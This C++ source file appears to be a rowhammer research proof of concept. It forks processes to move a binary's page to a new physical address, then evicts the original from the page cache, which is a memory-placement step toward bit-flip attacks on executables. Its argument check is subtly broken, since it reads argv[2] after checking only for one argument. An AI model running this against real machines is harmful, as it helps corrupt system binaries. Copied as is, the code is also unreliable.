#include "libhammer.h"

using namespace std;

int main(int argc, char **argv)
{
    if (argc < 2)
    {
        cout << "usage: waylaying [path]" << endl;
        return 0;
    }

    string fname(argv[1]);
    uint64_t addr;
    stringstream ss;
    ss << hex << argv[2]; ss >> addr;
    cout << "CHILD_MAX = " << sysconf(_SC_CHILD_MAX) << endl;
    cout << "path: " << fname << ", pa=" << hex << get_binary_pa(fname) << " addr=" << addr << endl;
   // return 0;
    // 1. do_chasing mmapS the file image with private and r/w access
    // 2. uses multiple fork().
    // 3. each child write to page, effectively changing image phys-addr. only the last one returns valid f.image
    ImageFile f = do_chasing(fname, addr);
    if (f.image)
    {
        // 4. evict original binary from page cache, using waylaying
        do_waylaying();
        // 5. unmap the fake image
        munmap(f.image, f.sz);
        // 6. immediately mmap the original image again!
        cout << "path: " << fname << ", pa=" << hex << get_binary_pa(fname) << endl;
    }

    return 0;
}
